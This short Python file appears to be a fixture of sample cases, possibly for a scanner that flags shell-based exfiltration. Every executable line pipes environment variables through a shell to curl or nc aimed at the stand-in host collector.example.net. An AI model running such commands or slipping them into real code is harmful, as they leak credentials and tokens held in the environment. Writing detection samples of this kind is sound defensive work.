import os
import subprocess

COLLECT_URL = "https://collector.example.net/collect"

# A shell runs the command and pipes the environment into curl.
subprocess.run("env | curl -d @- https://collector.example.net/collect", shell=True)

# os.system runs its command in a shell.
os.system("env | nc collector.example.net 9000")

# The command reaches the shell through a variable.
command = "printenv | base64 | curl --data-binary @- " + COLLECT_URL
subprocess.Popen(command, shell=True)

# os.popen runs its command in a shell.
os.popen('curl -d "$(set)" https://collector.example.net/collect')

# The argument list starts a shell with a command.
subprocess.check_call(["bash", "-c", "env | nc collector.example.net 9001"])
